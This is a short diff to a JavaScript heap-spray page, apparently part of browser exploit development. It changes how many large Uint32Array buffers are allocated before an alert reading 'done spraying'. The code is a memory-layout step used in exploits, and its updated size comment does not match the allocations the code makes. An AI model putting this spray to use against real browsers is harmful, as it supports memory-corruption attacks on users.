@@ -6,7 +6,7 @@
             <script>
                 var uMaxArraySize = 0x1000000;
                 var aauHeap = [];
-                for (var i = 1; i<100 ; i++) {
+                for (var i = 1; i<=63 ; i++) {
                     console.log("Allocating 0x" + (uMaxArraySize * 4).toString(16) + " bytes "+i);
                     aauHeap.push(auHeap = new Uint32Array(uMaxArraySize));
                     auHeap[0] = 0;
@@ -21,7 +21,7 @@
                     auHeap[9] = 9;
                     auHeap[10] = 10;
                     auHeap[11] = 11;
-                } // i = 64 is max
+                } // i = 63 is max -> (0x400000 + 0x2000 + 0x2000 ) x 64 = 0x1 0100 0000
 
                 alert("done spraying: ");
 
